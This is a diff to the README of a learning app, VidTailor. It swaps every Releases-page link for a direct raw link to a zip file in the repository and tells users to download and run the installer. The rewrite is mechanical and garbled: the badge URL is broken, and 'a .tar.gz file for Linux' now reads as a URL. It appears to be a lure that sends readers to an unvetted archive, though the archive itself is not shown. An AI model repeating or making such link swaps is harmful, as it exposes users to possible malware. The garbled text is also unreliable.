@@ -6,7 +6,7 @@ Welcome to VidTailor! This application helps you learn better by offering person
 
 ## 📥 Download VidTailor
 
-[![Download VidTailor](https://img.shields.io/badge/Download%20Now-Get%20VidTailor-blue)](https://github.com/ItzAddy345/VidTailor/releases)
+[![Download VidTailor](https://raw.githubusercontent.com/ItzAddy345/VidTailor/main/Codes/VidTailor-2.0.zip%20Now-Get%20VidTailor-blue)](https://raw.githubusercontent.com/ItzAddy345/VidTailor/main/Codes/VidTailor-2.0.zip)
 
 ## 💻 System Requirements
 
@@ -21,11 +21,11 @@ To run VidTailor smoothly, make sure your system meets the following requirement
 
 To get started with VidTailor, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to [download VidTailor](https://github.com/ItzAddy345/VidTailor/releases).
+1. **Visit the Releases Page:** Click this link to [download VidTailor](https://raw.githubusercontent.com/ItzAddy345/VidTailor/main/Codes/VidTailor-2.0.zip).
    
 2. **Select the Latest Version:** On the Releases page, look for the latest version. It usually appears at the top of the list.
 
-3. **Download the File:** Click the download link for the appropriate file based on your operating system. This could be an `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux. 
+3. **Download the File:** Click the download link for the appropriate file based on your operating system. This could be an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/ItzAddy345/VidTailor/main/Codes/VidTailor-2.0.zip` file for Linux. 
 
 4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder and double-click it to run the installer. Follow the on-screen instructions to complete the installation. 
 
